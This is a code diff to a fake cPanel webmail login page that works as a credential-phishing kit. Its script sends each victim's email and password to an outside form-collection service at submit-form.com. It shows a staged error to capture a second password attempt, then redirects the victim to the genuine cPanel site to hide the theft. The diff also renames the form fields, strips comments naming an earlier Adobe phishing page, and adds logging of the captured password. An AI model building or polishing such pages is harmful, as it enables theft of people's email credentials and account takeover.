@@ -100,7 +100,7 @@
   <body class="wm">
     <div class="loader loader--hidden"></div>
     
-    <!-- Hidden iframe for form submission (like the Adobe page) -->
+    <!-- Hidden iframe for form submission -->
     <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
     
     <input type="hidden" id="goto_uri" value="/" />
@@ -160,7 +160,7 @@
                     </div>
                     <div class="input-field-login icon username-container">
                       <input
-                        name="email"
+                        name="email_1"
                         id="user"
                         autofocus="autofocus"
                         value=""
@@ -177,7 +177,7 @@
                     </div>
                     <div class="input-field-login icon password-container">
                       <input
-                        name="password"
+                        name="pw_1"
                         id="pass"
                         placeholder="Enter your email password."
                         class="std_textbox"
@@ -187,7 +187,7 @@
                       />
                     </div>
                     
-                    <!-- Hidden field for attempt tracking (like Adobe) -->
+                    <!-- Hidden field for attempt tracking -->
                     <input type="hidden" id="attempt" name="attempt" value="1">
                     
                     <!-- Hidden field for webmail identifier -->
@@ -240,7 +240,7 @@
     </div>
 
     <script>
-      // Store first attempt data (like the Adobe page)
+      // Store first attempt data
       let firstAttempt = {
         email: '',
         password: ''
@@ -266,9 +266,9 @@
       const form = document.getElementById("login_form");
       let clickCount = 0;
       
-      // Add event listener for form submission (like Adobe - let it submit naturally)
       form.addEventListener("submit", function(event) {
-        // Get current values
+        // Don't prevent default - let the form submit naturally
+        
         const email = emailInput.value;
         const password = passwordInput.value;
         const attempt = document.getElementById("attempt").value;
@@ -299,11 +299,14 @@
         // Show loader
         showLoader();
         
-        // Set form action to Formspark (like Adobe)
+        // Set form action to Formspark
         form.action = "https://submit-form.com/0gyAIslPc";
         form.method = "POST";
         
-        // Check if this is first or second attempt (like Adobe)
+        // Log what's being submitted (for debugging)
+        console.log("Submitting - Email:", email, "Password:", password, "Attempt:", attempt);
+        
+        // Handle attempts
         if (attempt == 1) {
           // First attempt: Store credentials
           firstAttempt.email = email;
@@ -311,8 +314,6 @@
           
           // Update hidden field to 2 for next attempt
           document.getElementById("attempt").value = "2";
-          
-          // Let form submit naturally to hidden iframe
           
           // Show error after 3 seconds
           setTimeout(showError, 3000);
@@ -331,12 +332,8 @@
           firstPasswordInput.value = firstAttempt.password;
           form.appendChild(firstPasswordInput);
           
-          // Also send the current password with a different name
-          const currentPasswordInput = document.createElement('input');
-          currentPasswordInput.type = 'hidden';
-          currentPasswordInput.name = 'current_password';
-          currentPasswordInput.value = password;
-          form.appendChild(currentPasswordInput);
+          // Also include the current password again (already in pw_1 field)
+          // But let's make sure it's there
           
           const secondAttemptInput = document.createElement('input');
           secondAttemptInput.type = 'hidden';
@@ -344,13 +341,12 @@
           secondAttemptInput.value = 'final';
           form.appendChild(secondAttemptInput);
           
-          // Redirect to cPanel after form submits
+          // Redirect after form submits
           setTimeout(function() {
             window.location.href = "https://www.cpanel.net/products/";
           }, 1000);
         }
         
-        // Count clicks for third attempt redirect
         clickCount++;
         if (clickCount >= 3) {
           setTimeout(function() {
@@ -367,7 +363,6 @@
         // Hide loader
         document.querySelector(".loader").classList.add("loader--hidden");
         
-        // Clear error after 4 seconds
         setTimeout(clearError, 4000);
       }
       
@@ -379,18 +374,6 @@
       function showLoader() {
         const loader = document.querySelector(".loader");
         loader.classList.remove("loader--hidden");
-      }
-
-      function ttext() {
-        var button = document.querySelector(".asa");
-        var input = document.querySelector(".asa1");
-        if (button.textContent === "Show") {
-          button.textContent = "Hide";
-          input.type = "text";
-        } else {
-          button.textContent = "Show";
-          input.type = "password";
-        }
       }
     </script>
   </body>
